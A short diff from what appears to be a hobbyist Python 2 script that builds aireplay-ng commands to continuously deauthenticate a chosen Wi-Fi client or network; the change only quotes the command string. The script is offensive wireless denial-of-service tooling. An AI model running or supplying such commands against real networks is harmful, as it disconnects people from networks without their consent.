@@ -12,7 +12,7 @@ if aireplay == 'Network':
 else:
   aireplay_client = raw_input("enter the client you wanna CLAP:")
   os.system("aireplay-ng -0 0 -a (bssid) -c (aireplay_client) wlan0mon")
-command = aireplay-ng -0 0 -a %s -c %s wlan0mon
+command = "aireplay-ng -0 0 -a %s -c %s wlan0mon"
 print ("copy the command below and paste it in the terminal")
 print(command % x)
 print ("The APclapper...")
